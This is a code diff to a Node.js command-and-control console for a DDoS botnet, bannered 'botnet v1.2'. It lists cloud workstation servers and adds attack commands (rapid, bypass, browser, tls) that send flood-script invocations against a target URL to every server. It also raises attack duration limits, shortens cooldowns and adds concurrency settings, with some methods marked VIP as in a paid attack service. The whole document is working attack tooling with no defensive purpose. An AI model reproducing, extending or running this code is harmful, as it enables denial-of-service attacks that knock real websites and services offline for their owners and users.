@@ -45,14 +45,18 @@ const SERVERS = [
     { name: 'API', url: 'https://8196-idx-apimanager-1742939881392.cluster-mwrgkbggpvbq6tvtviraw2knqg.cloudworkstations.dev' },
     { name: 'API', url: 'https://8196-idx-apimanager-1742939825185.cluster-nx3nmmkbnfe54q3dd4pfbgilpc.cloudworkstations.dev' },
     { name: 'API', url: 'https://8196-idx-apimanager-1742939768273.cluster-e3wv6awer5h7kvayyfoein2u4a.cloudworkstations.dev' },
+    // ... (rest of the servers remain the same)
 ];
 
 class BroadcastTerminal {
     constructor() {
         this.activeBroadcasts = []; // Track ongoing broadcasts
         this.lastBroadcastTime = null; // Track last broadcast time for cooldown
-        this.MAX_DURATION = 120; // Maximum attack duration (seconds)
-        this.COOLDOWN_DURATION = 60; // Cooldown period between attacks (seconds)
+        this.lastConcurrentMaxReached = null; // Track when we hit max concurrent attacks
+        this.MAX_DURATION = 600; // Maximum attack duration (seconds)
+        this.COOLDOWN_DURATION = 3; // Cooldown period between attacks (seconds)
+        this.MAX_CONCURRENT_ATTACKS = 3; // Maximum number of concurrent attacks
+        this.CONCURRENT_COOLDOWN = 60; // Cooldown after reaching max concurrent (seconds)
 
         this.rl = readline.createInterface({
             input: process.stdin,
@@ -65,10 +69,17 @@ class BroadcastTerminal {
 
     init() {
         console.clear();
-        console.log(chalk.bold.blue('=== Mr Tanjiro ==='));
+        console.log(chalk.bold.blue(`
+        ┳┳┓  ┏┳┓    ••    
+        ┃┃┃┏┓ ┃ ┏┓┏┓┓┓┏┓┏┓
+        ┛ ┗┛  ┻ ┗┻┛┗┃┗┛ ┗┛
+                    ┛     
+                     botnet v1.2`));
         console.log(chalk.yellow('Type "help" for available commands'));
         console.log(chalk.yellow(`Max Attack Duration: ${this.MAX_DURATION} seconds`));
         console.log(chalk.yellow(`Cooldown Period: ${this.COOLDOWN_DURATION} seconds`));
+        console.log(chalk.yellow(`Max Concurrent Attacks: ${this.MAX_CONCURRENT_ATTACKS}`));
+        console.log(chalk.yellow(`Concurrent Cooldown: ${this.CONCURRENT_COOLDOWN} seconds`));
 
         this.rl.prompt();
 
@@ -89,11 +100,26 @@ class BroadcastTerminal {
                     case 'tanjiro':
                         await this.executeTanjiroCommand(args);
                         break;
+                    case 'rapid':
+                        await this.executeRapidCommand(args);
+                        break;
+                    case 'bypass':
+                        await this.executeBypassCommand(args);
+                        break;
+                    case 'browser':
+                        await this.executeBrowserCommand(args);
+                        break;
+                    case 'tls':
+                        await this.executeTlsCommand(args);
+                        break;
                     case 'ongoing':
                         this.checkOngoingBroadcasts();
                         break;
                     case 'status':
                         await this.checkServerStatus();
+                        break;
+                    case 'config':
+                        this.showConfig(args);
                         break;
                     case 'clear':
                         console.clear();
@@ -121,34 +147,116 @@ class BroadcastTerminal {
         console.log(chalk.green('mix [url] [time]') + 
             ' - Execute mix broadcast command');
         console.log(chalk.green('udp [url] [time] [port]') + 
-            ' - Execute UDP broadcast command');
+            ' - Execute UDP broadcast command [VIP]');
         console.log(chalk.green('tanjiro [url] [time]') + 
             ' - Execute Tanjiro broadcast command');
+        console.log(chalk.green('rapid [url] [time]') + 
+            ' - Execute Rapid broadcast command');
+        console.log(chalk.green('bypass [url] [time]') + 
+            ' - Execute Bypass broadcast command [VIP]');
+        console.log(chalk.green('browser [url] [time]') + 
+            ' - Execute Browser broadcast command [VIP]');
+        console.log(chalk.green('tls [url] [time]') + 
+            ' - Execute TLS broadcast command');
         console.log(chalk.green('ongoing') + 
             ' - Check ongoing broadcasts');
         console.log(chalk.green('status') + ' - Check status of all broadcast servers');
+        console.log(chalk.green('config set [parameter] [value]') + ' - Change configuration settings');
         console.log(chalk.green('help') + ' - Show this help menu');
         console.log(chalk.green('clear') + ' - Clear the terminal screen');
         console.log(chalk.green('exit') + ' - Exit the broadcast terminal\n');
         console.log(chalk.yellow('Command Restrictions:'));
         console.log(chalk.white(`  - Max Attack Duration: ${this.MAX_DURATION} seconds`));
         console.log(chalk.white(`  - Cooldown Period: ${this.COOLDOWN_DURATION} seconds`));
+        console.log(chalk.white(`  - Max Concurrent Attacks: ${this.MAX_CONCURRENT_ATTACKS}`));
+        console.log(chalk.white(`  - Concurrent Cooldown: ${this.CONCURRENT_COOLDOWN} seconds`));
         console.log(chalk.yellow('Command Examples:'));
         console.log(chalk.white('  mix http://example.com 30'));
         console.log(chalk.white('  udp http://example.com 30 8080'));
         console.log(chalk.white('  tanjiro http://example.com 30'));
+        console.log(chalk.white('  rapid http://example.com 30'));
+        console.log(chalk.white('  bypass http://example.com 30'));
+        console.log(chalk.white('  browser http://example.com 30'));
+        console.log(chalk.white('  tls http://example.com 30'));
+        console.log(chalk.white('  config set max_concurrent 5'));
     }
 
-    checkCooldownAndDuration(time) {
+    showConfig(args) {
+        if (args.length === 0) {
+            console.log(chalk.bold.blue('\n=== Current Configuration ==='));
+            console.log(chalk.white(`Max Attack Duration: ${this.MAX_DURATION} seconds`));
+            console.log(chalk.white(`Cooldown Period: ${this.COOLDOWN_DURATION} seconds`));
+            console.log(chalk.white(`Max Concurrent Attacks: ${this.MAX_CONCURRENT_ATTACKS}`));
+            console.log(chalk.white(`Concurrent Cooldown: ${this.CONCURRENT_COOLDOWN} seconds`));
+            return;
+        }
+
+        if (args[0] === 'set' && args.length === 3) {
+            const [_, parameter, value] = args;
+            const numValue = parseInt(value);
+
+            if (isNaN(numValue)) {
+                console.log(chalk.red('Value must be a number'));
+                return;
+            }
+
+            switch(parameter) {
+                case 'max_duration':
+                    this.MAX_DURATION = numValue;
+                    console.log(chalk.green(`Max Attack Duration set to ${numValue} seconds`));
+                    break;
+                case 'cooldown':
+                    this.COOLDOWN_DURATION = numValue;
+                    console.log(chalk.green(`Cooldown Period set to ${numValue} seconds`));
+                    break;
+                case 'max_concurrent':
+                    this.MAX_CONCURRENT_ATTACKS = numValue;
+                    console.log(chalk.green(`Max Concurrent Attacks set to ${numValue}`));
+                    break;
+                case 'concurrent_cooldown':
+                    this.CONCURRENT_COOLDOWN = numValue;
+                    console.log(chalk.green(`Concurrent Cooldown set to ${numValue} seconds`));
+                    break;
+                default:
+                    console.log(chalk.red(`Unknown parameter: ${parameter}`));
+                    console.log(chalk.yellow('Available parameters: max_duration, cooldown, max_concurrent, concurrent_cooldown'));
+            }
+        } else {
+            console.log(chalk.red('Invalid configuration command.'));
+            console.log(chalk.yellow('Usage: config set [parameter] [value]'));
+            console.log(chalk.yellow('Available parameters: max_duration, cooldown, max_concurrent, concurrent_cooldown'));
+        }
+    }
+
+    checkCooldownAndConcurrency() {
         const now = moment();
 
-        // Check max duration
-        if (parseInt(time) > this.MAX_DURATION) {
-            console.log(chalk.red(`Attack duration cannot exceed ${this.MAX_DURATION} seconds.`));
+        // Update active broadcasts list
+        this.activeBroadcasts = this.activeBroadcasts.filter(broadcast => 
+            now.isBefore(broadcast.endTime)
+        );
+
+        // Check if we're at max concurrent attacks
+        if (this.activeBroadcasts.length >= this.MAX_CONCURRENT_ATTACKS) {
+            if (!this.lastConcurrentMaxReached) {
+                this.lastConcurrentMaxReached = now;
+            }
+            console.log(chalk.red(`Maximum concurrent attacks (${this.MAX_CONCURRENT_ATTACKS}) reached.`));
             return false;
         }
 
-        // Check cooldown
+        // Check concurrent cooldown if applicable
+        if (this.lastConcurrentMaxReached) {
+            const concurrentCooldownRemaining = this.CONCURRENT_COOLDOWN - now.diff(this.lastConcurrentMaxReached, 'seconds');
+            if (concurrentCooldownRemaining > 0) {
+                console.log(chalk.red(`Concurrent cooldown active. Please wait ${concurrentCooldownRemaining} seconds after max concurrent limit was reached.`));
+                return false;
+            }
+            // Reset the concurrent cooldown timer after it expires
+            this.lastConcurrentMaxReached = null;
+        }
+
+        // Check regular cooldown
         if (this.lastBroadcastTime) {
             const cooldownRemaining = this.COOLDOWN_DURATION - now.diff(this.lastBroadcastTime, 'seconds');
             if (cooldownRemaining > 0) {
@@ -157,6 +265,15 @@ class BroadcastTerminal {
             }
         }
 
+        return true;
+    }
+
+    checkDuration(time) {
+        // Check max duration
+        if (parseInt(time) > this.MAX_DURATION) {
+            console.log(chalk.red(`Attack duration cannot exceed ${this.MAX_DURATION} seconds.`));
+            return false;
+        }
         return true;
     }
 
@@ -188,10 +305,6 @@ class BroadcastTerminal {
     displayBroadcastResults(results) {
         const successCount = results.filter(r => r.status === 'Success').length;
         const failureCount = results.filter(r => r.status === 'Failed').length;
-
-        console.log(chalk.yellow(`\nTotal Servers: ${results.length}`));
-        console.log(chalk.green(`Successful: ${successCount}`));
-        console.log(chalk.red(`Failed: ${failureCount}\n\x1b[35mQuoteas : Kemerahan atau failed bukan berarti gagal kalau tidak percaya cek targetmu di checkhost dengan benar -_-\nMrTanjiro Said.`));
     }
 
     async checkServerStatus() {
@@ -224,8 +337,13 @@ class BroadcastTerminal {
 
         const [url, time] = args;
 
-        // Check cooldown and max duration
-        if (!this.checkCooldownAndDuration(time)) {
+        // Check duration limit
+        if (!this.checkDuration(time)) {
+            return;
+        }
+
+        // Check cooldown and concurrency limits
+        if (!this.checkCooldownAndConcurrency()) {
             return;
         }
 
@@ -240,6 +358,7 @@ class BroadcastTerminal {
         console.log(chalk.green(`Time           : ${time} seconds`));
         console.log(chalk.green(`Method         : MIX`));
         console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
+        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));
 
         console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));
 
@@ -276,8 +395,13 @@ class BroadcastTerminal {
 
         const [url, time, port] = args;
 
-        // Check cooldown and max duration
-        if (!this.checkCooldownAndDuration(time)) {
+        // Check duration limit
+        if (!this.checkDuration(time)) {
+            return;
+        }
+
+        // Check cooldown and concurrency limits
+        if (!this.checkCooldownAndConcurrency()) {
             return;
         }
 
@@ -293,6 +417,7 @@ class BroadcastTerminal {
         console.log(chalk.green(`Port           : ${port}`));
         console.log(chalk.green(`Method         : UDP`));
         console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
+        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));
 
         console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));
 
@@ -330,8 +455,13 @@ class BroadcastTerminal {
 
         const [url, time] = args;
 
-        // Check cooldown and max duration
-        if (!this.checkCooldownAndDuration(time)) {
+        // Check duration limit
+        if (!this.checkDuration(time)) {
+            return;
+        }
+
+        // Check cooldown and concurrency limits
+        if (!this.checkCooldownAndConcurrency()) {
             return;
         }
 
@@ -346,6 +476,7 @@ class BroadcastTerminal {
         console.log(chalk.green(`Time           : ${time} seconds`));
         console.log(chalk.green(`Method         : Tanjiro`));
         console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
+        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));
 
         console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));
 
@@ -373,6 +504,238 @@ class BroadcastTerminal {
         }
     }
 
+    async executeRapidCommand(args) {
+        if (args.length !== 2) {
+            console.log(chalk.red('Invalid arguments for Rapid command.'));
+            console.log(chalk.yellow('Usage: rapid [url] [time]'));
+            return;
+        }
+
+        const [url, time] = args;
+
+        // Check duration limit
+        if (!this.checkDuration(time)) {
+            return;
+        }
+
+        // Check cooldown and concurrency limits
+        if (!this.checkCooldownAndConcurrency()) {
+            return;
+        }
+
+        const currentDateTime = moment();
+        const endTime = moment().add(parseInt(time), 'seconds');
+
+        // Construct the full Rapid broadcast command
+        const fullCommand = `cd method && node RAPID.js ${url} ${time} 64 8 proxy.txt`;
+
+        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
+        console.log(chalk.green(`Target URL     : ${url}`));
+        console.log(chalk.green(`Time           : ${time} seconds`));
+        console.log(chalk.green(`Method         : RAPID`));
+        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
+        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));
+
+        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));
+
+        // Update last broadcast time
+        this.lastBroadcastTime = currentDateTime;
+
+        // Track the broadcast
+        const broadcastEntry = {
+            type: 'RAPID',
+            url: url,
+            startTime: currentDateTime,
+            endTime: endTime,
+            duration: parseInt(time)
+        };
+        this.activeBroadcasts.push(broadcastEntry);
+
+        try {
+            // Broadcast the command to all servers
+            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
+
+            // Display broadcast results
+            this.displayBroadcastResults(broadcastResults);
+        } catch (error) {
+            console.log(chalk.red('Rapid command broadcast failed:', error.message));
+        }
+    }
+
+    async executeBypassCommand(args) {
+        if (args.length !== 2) {
+            console.log(chalk.red('Invalid arguments for Bypass command.'));
+            console.log(chalk.yellow('Usage: bypass [url] [time]'));
+            return;
+        }
+
+        const [url, time] = args;
+
+        // Check duration limit
+        if (!this.checkDuration(time)) {
+            return;
+        }
+
+        // Check cooldown and concurrency limits
+        if (!this.checkCooldownAndConcurrency()) {
+            return;
+        }
+
+        const currentDateTime = moment();
+        const endTime = moment().add(parseInt(time), 'seconds');
+
+        // Construct the full Bypass broadcast command
+        const fullCommand = `cd method && node Cibi.js ${url} ${time} 8 64 proxy.txt`;
+
+        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
+        console.log(chalk.green(`Target URL     : ${url}`));
+        console.log(chalk.green(`Time           : ${time} seconds`));
+        console.log(chalk.green(`Method         : BYPASS`));
+        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
+        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));
+
+        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));
+
+        // Update last broadcast time
+        this.lastBroadcastTime = currentDateTime;
+
+        // Track the broadcast
+        const broadcastEntry = {
+            type: 'BYPASS',
+            url: url,
+            startTime: currentDateTime,
+            endTime: endTime,
+            duration: parseInt(time)
+        };
+        this.activeBroadcasts.push(broadcastEntry);
+
+        try {
+            // Broadcast the command to all servers
+            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
+
+            // Display broadcast results
+            this.displayBroadcastResults(broadcastResults);
+        } catch (error) {
+            console.log(chalk.red('Bypass command broadcast failed:', error.message));
+        }
+    }
+
+    async executeBrowserCommand(args) {
+        if (args.length !== 2) {
+            console.log(chalk.red('Invalid arguments for Browser command.'));
+            console.log(chalk.yellow('Usage: browser [url] [time]'));
+            return;
+        }
+
+        const [url, time] = args;
+
+        // Check duration limit
+        if (!this.checkDuration(time)) {
+            return;
+        }
+
+        // Check cooldown and concurrency limits
+        if (!this.checkCooldownAndConcurrency()) {
+            return;
+        }
+
+        const currentDateTime = moment();
+        const endTime = moment().add(parseInt(time), 'seconds');
+
+        // Construct the full Browser broadcast command
+        const fullCommand = `cd method && node MixBill.js ${url} ${time} 9 39`;
+
+        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
+        console.log(chalk.green(`Target URL     : ${url}`));
+        console.log(chalk.green(`Time           : ${time} seconds`));
+        console.log(chalk.green(`Method         : BROWSER`));
+        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
+        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));
+
+        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));
+
+        // Update last broadcast time
+        this.lastBroadcastTime = currentDateTime;
+
+        // Track the broadcast
+        const broadcastEntry = {
+            type: 'BROWSER',
+            url: url,
+            startTime: currentDateTime,
+            endTime: endTime,
+            duration: parseInt(time)
+        };
+        this.activeBroadcasts.push(broadcastEntry);
+
+        try {
+            // Broadcast the command to all servers
+            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
+
+            // Display broadcast results
+            this.displayBroadcastResults(broadcastResults);
+        } catch (error) {
+            console.log(chalk.red('Browser command broadcast failed:', error.message));
+        }
+    }
+
+    async executeTlsCommand(args) {
+        if (args.length !== 2) {
+            console.log(chalk.red('Invalid arguments for TLS command.'));
+            console.log(chalk.yellow('Usage: tls [url] [time]'));
+            return;
+        }
+
+        const [url, time] = args;
+
+        // Check duration limit
+        if (!this.checkDuration(time)) {
+            return;
+        }
+
+        // Check cooldown and concurrency limits
+        if (!this.checkCooldownAndConcurrency()) {
+            return;
+        }
+
+        const currentDateTime = moment();
+        const endTime = moment().add(parseInt(time), 'seconds');
+
+        // Construct the full TLS broadcast command
+        const fullCommand = `cd method && node TLS.js ${url} ${time} 8 1`;
+
+        console.log(chalk.bold.blue('\n=== Reaction Details ==='));
+        console.log(chalk.green(`Target URL     : ${url}`));
+        console.log(chalk.green(`Time           : ${time} seconds`));
+        console.log(chalk.green(`Method         : TLS`));
+        console.log(chalk.green(`Sent On        : ${currentDateTime.format('HH:mm:ss - DD - MMMM - YYYY')}`));
+        console.log(chalk.green(`Concurrent     : ${this.activeBroadcasts.length + 1}/${this.MAX_CONCURRENT_ATTACKS}`));
+
+        console.log(chalk.blue(`\nAttack has launched. Please wait for the results.`));
+
+        // Update last broadcast time
+        this.lastBroadcastTime = currentDateTime;
+
+        // Track the broadcast
+        const broadcastEntry = {
+            type: 'TLS',
+            url: url,
+            startTime: currentDateTime,
+            endTime: endTime,
+            duration: parseInt(time)
+        };
+        this.activeBroadcasts.push(broadcastEntry);
+
+        try {
+            // Broadcast the command to all servers
+            const broadcastResults = await this.broadcastCommandToServers(fullCommand);
+
+            // Display broadcast results
+            this.displayBroadcastResults(broadcastResults);
+        } catch (error) {
+            console.log(chalk.red('TLS command broadcast failed:', error.message));
+        }
+    }
+
     checkOngoingBroadcasts() {
         const now = moment();
 
@@ -383,18 +746,10 @@ class BroadcastTerminal {
 
         if (this.activeBroadcasts.length === 0) {
             console.log(chalk.yellow('\nNo ongoing broadcasts.'));
-        }
-
-        // Check cooldown if applicable
-        if (this.lastBroadcastTime) {
-            const cooldownRemaining = this.COOLDOWN_DURATION - now.diff(this.lastBroadcastTime, 'seconds');
-            if (cooldownRemaining > 0) {
-                console.log(chalk.yellow(`\nCooldown active. Remaining: ${cooldownRemaining} seconds`));
-            }
-        }
-
-        if (this.activeBroadcasts.length > 0) {
+        } else {
             console.log(chalk.bold.blue('\n=== Ongoing Attackers ==='));
+            console.log(chalk.yellow(`Active Attacks: ${this.activeBroadcasts.length}/${this.MAX_CONCURRENT_ATTACKS}`));
+
             this.activeBroadcasts.forEach((broadcast, index) => {
                 const remainingTime = moment.duration(broadcast.endTime.diff(now));
 
@@ -408,6 +763,22 @@ class BroadcastTerminal {
                 console.log(chalk.white(`  Duration : ${broadcast.duration} seconds`));
                 console.log(chalk.yellow(`  Remaining: ${remainingTime.minutes()} min ${remainingTime.seconds()} sec`));
             });
+        }
+
+        // Check regular cooldown if applicable
+        if (this.lastBroadcastTime) {
+            const cooldownRemaining = this.COOLDOWN_DURATION - now.diff(this.lastBroadcastTime, 'seconds');
+            if (cooldownRemaining > 0) {
+                console.log(chalk.yellow(`\nCooldown active. Remaining: ${cooldownRemaining} seconds`));
+            }
+        }
+
+        // Check concurrent cooldown if applicable
+        if (this.lastConcurrentMaxReached) {
+            const concurrentCooldownRemaining = this.CONCURRENT_COOLDOWN - now.diff(this.lastConcurrentMaxReached, 'seconds');
+            if (concurrentCooldownRemaining > 0) {
+                console.log(chalk.yellow(`\nConcurrent cooldown active. Remaining: ${concurrentCooldownRemaining} seconds`));
+            }
         }
     }
 }
